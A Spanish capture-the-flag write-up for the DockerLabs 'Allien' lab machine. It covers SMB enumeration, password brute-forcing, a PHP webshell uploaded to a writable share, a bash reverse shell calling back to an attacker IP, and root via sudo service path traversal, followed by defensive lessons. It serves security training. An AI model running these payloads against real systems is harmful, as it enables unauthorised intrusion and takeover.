# Allien — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** Luisillo_o  
**Fecha de creación:** 10/10/2024  
**Técnicas:** Nmap · Gobuster · Enum4linux · CrackMapExec · SMBMap · PHP webshell · Reverse Shell · TTY · Privesc (service/sudo)

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web](#2-enumeración-web)
3. [Enumeración SMB — enum4linux y crackmapexec](#3-enumeración-smb--enum4linux-y-crackmapexec)
4. [Exploración SMB — credenciales en backup24](#4-exploración-smb--credenciales-en-backup24)
5. [Subir webshell al servidor web via SMB](#5-subir-webshell-al-servidor-web-via-smb)
6. [Reverse Shell y tratamiento TTY](#6-reverse-shell-y-tratamiento-tty)
7. [Escalada de privilegios](#7-escalada-de-privilegios)
8. [Lección aprendida](#8-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh allien.tar
```

> IP asignada: `172.17.0.2`.

Escaneo inicial:

```bash
nmap -Pn 172.17.0.2
```

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Escaneo con versiones:

```bash
nmap -p22,80,139,445 -sCV -Pn 172.17.0.2
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Login
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  microsoft-ds Samba smbd 4
| smb2-security-mode:
|   3:1:1: Message signing enabled but not required
|_nbstat: NetBIOS name: SAMBASERVER
```

Tenemos **SMB** — un vector muy interesante junto con el servidor web.

---

## 2. Enumeración web

Visitamos `http://172.17.0.2` — panel de inicio de sesión. Lanzamos Gobuster:

```bash
sudo gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://172.17.0.2 -x txt,php,html,py
```

```
/index.php     (Status: 200)
/info.php      (Status: 200)
/productos.php (Status: 200)
```

Nada explotable de forma directa. Nos centramos en SMB.

---

## 3. Enumeración SMB — enum4linux y crackmapexec

Enum4linux enumera información del servicio SMB sin credenciales:

```bash
enum4linux -a 172.17.0.2
```

```
S-1-5-21-3519099135-2650601337-1395019858-1000 SAMBASERVER\usuario1 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1001 SAMBASERVER\usuario2 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1002 SAMBASERVER\usuario3 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1003 SAMBASERVER\satriani7 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1004 SAMBASERVER\administrador (Local User)
```

Usuario encontrado: **satriani7**. Fuerza bruta con CrackMapExec:

```bash
crackmapexec smb 172.17.0.2 -u 'satriani7' -p /usr/share/wordlists/rockyou.txt
```

```
SMB  172.17.0.2  445  SAMBASERVER  [+] SAMBASERVER\satriani7:50cent
```

Credenciales: **satriani7:50cent**

---

## 4. Exploración SMB — credenciales en backup24

Con las credenciales de satriani7, exploramos los shares disponibles:

```bash
smbmap -H 172.17.0.2 -u satriani7 -p 50cent
```

```
Disk          Permissions    Comment
myshare       READ ONLY      Carpeta compartida sin restricciones
backup24      READ ONLY      Privado
home          NO ACCESS      Produccion
```

Exploramos `backup24/Documents/Personal`:

```bash
smbmap -H 172.17.0.2 -u satriani7 -p 50cent -r backup24/Documents/Personal
```

```
fr--r--r--  notes.txt
fr--r--r--  credentials.txt
```

Descargamos `credentials.txt`:

```bash
smbclient //172.17.0.2/backup24 -U satriani7%50cent
smb: \> get Documents/Personal/credentials.txt
```

El fichero contiene credenciales de múltiples usuarios, entre ellos:

```
7. Usuario: administrador
   - Contraseña: Adm1nP4ss2024
```

Con la cuenta de administrador, volvemos a comprobar permisos en los shares:

```bash
smbmap -H 172.17.0.2 -u administrador -p Adm1nP4ss2024
```

```
home   READ, WRITE   Produccion
```

> 💡 El share `home` con permisos de **escritura** es el directorio `/var/www/html` del servidor web — podemos subir archivos PHP que luego ejecutaremos desde el navegador.

---

## 5. Subir webshell al servidor web via SMB

Creamos una webshell PHP en nuestra máquina:

```bash
cat si.php
```

```php
<?php
system($_GET['cmd']);
?>
```

La subimos al share `home` vía smbclient:

```bash
smbclient //172.17.0.2/home -U administrador%Adm1nP4ss2024
smb: \> put si.php
putting file si.php as \si.php (15,6 kb/s)
smb: \> ls
  si.php   A  32  Thu Jul 10 20:50:41 2025
```

Comprobamos RCE desde el navegador:

```
http://172.17.0.2/si.php?cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✅ RCE confirmada como **www-data**.

---

## 6. Reverse Shell y tratamiento TTY

Ponemos Netcat a escuchar:

```bash
sudo nc -lvnp 443
```

Desde [revshells.com](https://www.revshells.com/) generamos el payload Bash y lo enviamos URL-encodeado:

```
http://172.17.0.2/si.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.26/443%200%3E%261%22
```

Recibimos la conexión. Hacemos tratamiento TTY para una shell interactiva:

```bash
www-data@3cb488fec1b0:/var/www/html$ script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
www-data@3cb488fec1b0:/var/www/html$ export SHELL=bash && export TERM=xterm
```

---

## 7. Escalada de privilegios

Comprobamos sudo:

```bash
www-data@3cb488fec1b0:/var/www/html$ sudo -l
```

```
User www-data may run the following commands on 3cb488fec1b0:
    (ALL) NOPASSWD: /usr/sbin/service
```

**service** con sudo sin contraseña. GTFObins nos da el comando:

```bash
www-data@3cb488fec1b0:/var/www/html$ sudo service ../../bin/sh
# whoami
root
```

> 💡 `service` acepta rutas con `../` relativas. Al pasar `../../bin/sh` como nombre de servicio, ejecuta `/bin/sh` como root en lugar de un servicio real.

✅ Somos **root**.

---

## 8. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **Enum4linux revela usuarios SMB sin autenticación** | Puerto 445 | Enumeración de cuentas del sistema |
| **Credenciales en credentials.txt en share SMB** | `backup24/Documents/Personal` | Acceso de administrador |
| **Share SMB con escritura al webroot** | Share `home` = `/var/www/html` | Upload de webshell PHP → RCE |
| **service con sudo** | `/usr/sbin/service` | Escalada a root con path traversal |

**Para defenderse:**
- Deshabilitar el acceso anónimo/invitado a SMB: `[global] restrict anonymous = 2`
- Nunca exponer el directorio web como share SMB. Los ficheros de aplicación deben estar en un directorio protegido.
- No almacenar credenciales en ficheros de texto en shares de red.
- Auditar los permisos sudo regularmente con `sudo -l` por cada usuario.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
